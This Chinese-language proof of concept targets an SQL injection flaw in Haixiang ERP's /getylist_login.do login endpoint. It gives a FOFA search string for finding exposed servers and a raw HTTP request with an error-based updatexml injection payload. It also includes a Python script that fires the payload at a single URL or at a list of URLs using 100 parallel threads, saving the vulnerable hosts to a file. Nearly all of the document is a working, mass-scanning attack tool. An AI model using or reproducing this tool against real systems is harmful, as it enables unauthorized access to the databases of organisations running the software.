### fofa

```markdown
body="checkMacWaitingSecond"
```

### payload

```markdown
POST /getylist_login.do HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
 
accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--
```

### 命令

```markdown
python3 '文件名.py' -f url.txt   # 批量测试url
python3 '文件名.py' -u url		  # 单个测试url
```

### poc

```python
import argparse,sys,requests
from multiprocessing.dummy import Pool

# 禁用urllib3警告
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'   # 输出颜色

# 打印程序欢迎界面
def banner():
    test = """
    
██   ██ ██    ██ ██      ██      ███████ ███████ ███████        ██████   █████  ████████ 
██   ██ ██    ██ ██      ██      ██      ██      ██            ██    ██ ██   ██    ██    
███████ ██    ██ ██      ██      █████   ███████ ███████ █████ ██    ██ ███████    ██    
██   ██ ██    ██ ██      ██      ██           ██      ██       ██    ██ ██   ██    ██    
██   ██  ██████  ███████ ███████ ███████ ███████ ███████        ██████  ██   ██    ██    
                                                                                         
                                                    data: 2024-09-08
                                                    version: 1.0
                                                    author: hulless-oat                        
    """
    print(test)

# 主函数
def main():
    banner() # 打印欢迎界面
    parser = argparse.ArgumentParser(description="海翔ERP SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='File Path')
    args = parser.parse_args()

    # 如果提供了url而没有提供文件路径
    if args.url and not args.file:
        poc(args.url)
    # 如果提供了文件路径而没有提供url
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100) # 创建一个线程池，最大线程数为100
        mp.map(poc,url_list) # 映射poc函数到url列表，并行执行
        mp.close() # 关闭线程池
        mp.join() # 等待所有线程执行完毕
    else:
        print(f"Uage:\n\t python3 {sys.argv[0]} -h")

# 漏洞检测函数
def poc(target):
    # 构造payload的url
    payload_url = '/getylist_login.do'
    url = target + payload_url
    headers = {
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
        'Content-Length':'0',
    }
    data = "accountname=test' and (updatexml(1,concat(0x7e,(select md5(123456)),0x7e),1));--+"

    try:
        res = requests.post(url=url,headers=headers,data=data,timeout=5,verify=False)
        if res.status_code == 500 and "e10adc3949ba59abbe56e057f20f883" in res.text:
            print(f"[+]{GREEN}存在SQL注入漏洞，{RESET}{target}\n")
            with open("result.txt","a",encoding="utf-8") as fp:
                fp.write(target+'\n')
        else:
            print(f"[-]该URL不存在SQL注入漏洞，url为{target}")

    except Exception as e:
        print(f"[*]该网站无法访问，url为{target}")

# 程序入口
if __name__ == '__main__':
    main()
```

